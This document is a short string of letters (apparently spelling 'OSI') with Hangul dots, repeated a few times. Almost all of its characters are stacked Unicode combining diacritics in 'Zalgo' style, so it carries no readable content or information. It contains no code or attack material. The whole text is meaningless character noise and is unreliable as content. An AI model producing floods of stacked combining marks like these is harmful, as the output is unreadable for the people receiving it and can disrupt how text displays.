̢̢̢̡̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕ͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅ